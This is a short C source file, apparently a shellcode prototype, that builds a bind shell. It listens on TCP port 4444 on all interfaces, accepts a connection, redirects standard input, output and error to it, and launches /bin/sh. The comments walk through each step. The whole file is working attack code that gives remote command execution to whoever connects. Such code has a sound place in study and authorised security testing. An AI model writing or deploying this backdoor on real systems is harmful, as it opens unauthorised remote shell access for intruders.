#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
 
void main() {
 // Create our socket
 int sock = socket (AF_INET, SOCK_STREAM, 0);
 // Preparing bind address
 struct sockaddr_in addr;
 // IPv4
 addr.sin_family = AF_INET;
 // Bind to 0.0.0.0
 addr.sin_addr.s_addr = INADDR_ANY; 
 // Port number to listen on
 addr.sin_port = htons(4444); 
 // Bind our socket and listen
 bind(sock, (struct sockaddr*)&addr, sizeof(addr));
 printf("size: %d", sizeof(addr));
 listen(sock, 1);
 // accept incoming connection
 int client = accept (sock, (struct sockaddr*)NULL, NULL);
 // Duplicate the file descriptors
 // stdin  = 0, stdout = 1, stderr = 2
 int i; 
 for (i=0; i <= 2; i++){
    dup2(client, i);
 }
 // Spawn the shell 
 char *argv[] = {"/bin/sh", 0};
 execve ("/bin/sh", argv, NULL);
}
